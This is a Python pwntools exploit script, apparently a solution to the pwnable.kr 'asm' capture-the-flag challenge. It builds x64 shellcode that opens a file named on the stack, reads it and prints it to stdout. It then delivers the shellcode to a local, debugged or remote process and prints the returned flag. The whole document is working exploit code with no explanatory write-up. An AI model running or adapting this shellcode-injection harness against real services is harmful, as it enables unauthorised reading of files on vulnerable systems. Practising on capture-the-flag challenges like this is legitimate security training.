#!/usr/bin/env python3

from pwn import *

# ===========================================================
#                    WRITE SHELLCODE
# ===========================================================


# filename to open
filename = b"this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong\x00"

# pack (32) the filename
packed_bytes = [u32(filename[i:i + 4]) for i in range(0, len(filename), 4)]

# write filename to stack
assembly_code = '[BITS 64]\n; make room for filename on stack\nsub rsp, 240\nmov rbx, rsp\n\n;write filename to stack\n'
for i in range(len(packed_bytes)):
    assembly_code += f'mov dword [rbx+{i*4}], {packed_bytes[i]}\n'


# open file for mode read
assembly_code += '\n; open the file (rax=5, rbx = filepath, rcx = 0)\n\
        ; int open(const char *pathname, int flags)\n\
        mov rax, 2\nmov rdi, rbx\nsyscall\n'

# read flag file into buffer
BUFFER_SIZE = 128
assembly_code += '\n; read the file (rax=0, rdi = fd, rsi = buffer, rdx = buffer size)\n'
assembly_code += f'sub rsp, {BUFFER_SIZE}\nmov rdi, rax\nxor rax, rax\n\
        mov rsi, rsp\nmov rdx, {BUFFER_SIZE}\nsyscall\n'

# write flag buffer to stdout
assembly_code += f'\n; write to stdout (rax=1, rdi = fd, rsi = buffer, rdx = buffer size)\n\
        ; ssize_t write(int fd, const void *buf, size_t count)\n\
        mov rdx, rax\n mov rax, 1\nmov rdi, 1\nmov rsi, rsp\nsyscall\n'

# exit program
assembly_code += '\n; exit program\n\
        ; void _exit(int status)\n\
        mov rax, 60\nxor rdi, rdi\nsyscall\n'

# write raw assembly to file
with open('shellcode.asm', 'w') as f:
    f.write(assembly_code)

# use NASM to assemble into shellcode
os.system('nasm -o shellcode shellcode.asm')
shellcode = open('shellcode', 'rb').read()

print("shellcode:")
print(shellcode, end='\n\n')

# ===========================================================
#                    HELPER FUNCTIONS
# ===========================================================


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
b main
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './asm'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Change logging level to help with debugging (error/warning/info/debug)
#context.log_level = 'debug'

# ===========================================================
#                    START OF EXPLOIT
# ===========================================================

io = start()
io.sendlineafter(b"give me your x64 shellcode: ", shellcode)
flag = io.recvline().decode()
io.close()

print("\nflag:", flag)
